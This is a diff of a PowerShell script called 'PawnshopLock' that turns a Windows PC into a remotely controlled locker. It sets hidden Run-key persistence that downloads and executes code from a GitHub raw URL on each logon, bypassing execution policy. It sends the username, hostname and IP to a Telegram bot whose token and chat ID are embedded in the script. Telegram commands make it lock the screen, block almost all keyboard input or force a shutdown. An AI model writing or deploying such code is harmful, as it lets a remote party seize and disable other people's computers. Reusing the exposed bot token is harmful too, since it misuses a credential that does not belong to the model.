@@ -1,36 +1,36 @@
 # ============================
-# PawnshopLock v6.0 - Stable
+# PawnshopLock v6.1 - Fixed
 # ============================
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# --- CONFIGURATION ---
+# --- CONFIG ---
 $imageURL = 'https://raw.githubusercontent.com/diezul/x/main/1.png'
 $botToken = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'
 $chatID   = '656189986'
 $rawURL   = 'https://raw.githubusercontent.com/diezul/x/main/pawnlock.ps1'
 
-# --- AUTOSTART ---
-$regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
-$regName = 'PawnshopLock'
-$cmd     = "powershell -w hidden -ep Bypass -Command `"iwr $rawURL | iex`""
+# --- AUTOSTART (HKCU\Run) ---
+$runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+$val    = 'PawnshopLock'
+$cmd    = "powershell -w hidden -ep Bypass -Command `"iwr $rawURL | iex`""
 try {
-    if ((Get-ItemProperty $regPath -Name $regName -ErrorAction SilentlyContinue).$regName -ne $cmd) {
-        New-Item -Path $regPath -Force | Out-Null
-        Set-ItemProperty -Path $regPath -Name $regName -Value $cmd
+    if ((Get-ItemProperty $runKey -Name $val -ErrorAction SilentlyContinue).$val -ne $cmd) {
+        New-Item -Path $runKey -Force | Out-Null
+        Set-ItemProperty -Path $runKey -Name $val -Value $cmd
     }
 } catch {}
 
-# --- VARIABLES ---
-$user    = $env:USERNAME
-$pc      = $env:COMPUTERNAME
-$lockCmd = "/lock$user".ToLower()
-$unlkCmd = "/unlock$user".ToLower()
-$shutCmd = "/shutdown$user".ToLower()
-$tempImg = "$env:TEMP\pawnlock.jpg"
+# --- ENV + IMAGE ---
+$user     = $env:USERNAME
+$pc       = $env:COMPUTERNAME
+$lockCmd  = "/lock$user".ToLower()
+$unlkCmd  = "/unlock$user".ToLower()
+$shutCmd  = "/shutdown$user".ToLower()
+$tempImg  = "$env:TEMP\pawnlock.jpg"
 
 try { Invoke-WebRequest $imageURL -OutFile $tempImg -UseBasicParsing } catch {}
 
-# --- Telegram send ---
+# --- SEND TELEGRAM MESSAGE ---
 function Send-TG($msg) {
     try {
         $body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
@@ -38,7 +38,7 @@ function Send-TG($msg) {
     } catch {}
 }
 
-# --- IP Grabber ---
+# --- GET LOCAL IP ---
 function Get-IP {
     try {
         (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^(127|169\.254|0\.|255|fe80)' })[0].IPAddress
@@ -83,15 +83,15 @@ public class KeyBlocker {
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
         if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
             int vkCode = Marshal.ReadInt32(lParam);
-            if (vkCode == 0x43) return CallNextHookEx(hookId, nCode, wParam, lParam); // C
-            return (IntPtr)1; // block everything else
+            if (vkCode == 0x43) return CallNextHookEx(hookId, nCode, wParam, lParam); // C key
+            return (IntPtr)1;
         }
         return CallNextHookEx(hookId, nCode, wParam, lParam);
     }
 }
 "@
 
-# --- FULLSCREEN IMAGE ---
+# --- LOCK SCREEN UI ---
 Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 $forms = $null
 function Lock-Screen {
@@ -113,6 +113,7 @@ function Lock-Screen {
     }
     Send-TG "$pc locked."
 }
+
 function Unlock-Screen {
     if (!$forms) { return }
     foreach ($f in $forms) { try { $f.Close() } catch {} }
@@ -121,30 +122,31 @@ function Unlock-Screen {
     Send-TG "$pc unlocked."
 }
 
-# --- TELEGRAM LISTENER LOOP ---
+# --- TELEGRAM POLLING LOOP ---
 Send-TG "Service online on $pc ($user) | IP: $(Get-IP())"
 $offset = 0
-$timer = New-Object Windows.Forms.Timer
-$timer.Interval = 5000
-$timer.Add_Tick({
+$poller = New-Object System.Timers.Timer
+$poller.Interval = 4000
+$poller.AutoReset = $true
+$poller.add_Elapsed({
     try {
         $url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
-        $response = Invoke-RestMethod $url -TimeoutSec 10
-        foreach ($u in $response.result) {
+        $updates = Invoke-RestMethod $url -TimeoutSec 10
+        foreach ($u in $updates.result) {
             $offset = $u.update_id + 1
             $txt = $u.message.text.ToLower() -replace "@\S+", "" -replace "\s+", ""
             if ($u.message.chat.id -ne [int]$chatID) { continue }
-            if ($txt -eq $lockCmd)      { Lock-Screen }
-            elseif ($txt -eq $unlkCmd)  { Unlock-Screen }
-            elseif ($txt -eq $shutCmd)  { Send-TG "$pc shutting down."; Stop-Computer -Force }
+            if ($txt -eq $lockCmd)     { Lock-Screen }
+            elseif ($txt -eq $unlkCmd) { Unlock-Screen }
+            elseif ($txt -eq $shutCmd) { Send-TG "$pc shutting down."; Stop-Computer -Force }
         }
-    } catch { }
+    } catch {}
 })
-$timer.Start()
+$poller.Start()
 
-# --- KEEP GUI LOOP ALIVE ---
+# --- START UI LOOP (needed only if locked) ---
 [System.Windows.Forms.Application]::Run()
 
 # --- CLEANUP ---
-$timer.Stop()
+$poller.Stop()
 [KeyBlocker]::Unblock()
